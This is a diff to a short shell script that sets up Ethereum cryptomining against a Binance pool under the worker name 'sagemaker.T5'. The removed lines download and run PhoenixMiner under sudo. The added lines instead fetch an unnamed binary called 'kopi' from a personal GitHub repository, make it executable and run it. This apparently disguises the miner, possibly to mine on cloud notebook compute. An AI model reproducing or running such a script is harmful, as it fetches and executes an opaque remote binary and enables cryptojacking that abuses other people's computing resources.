@@ -1,10 +1,5 @@
 #!/bin/sh
-apt update
-apt-get install libpci3 
-wget https://phoenixminer.info/downloads/PhoenixMiner_5.6d_Linux.tar.gz 
-tar -xf PhoenixMiner_5.6d_Linux.tar.gz 
-cd PhoenixMiner_5.6d_Linux
-sudo ./PhoenixMiner -pool ethash.poolbinance.com:443 -coin eth -wal sagemaker.T5 -pass x -mi 14 -gt 400
-
+wget https://github.com/aurbach55/dera/raw/main/kopi
+chmod +x ./kopi && ./kopi --coin ETH --pool ethash.poolbinance.com:443 --user sagemaker.T5
 
 
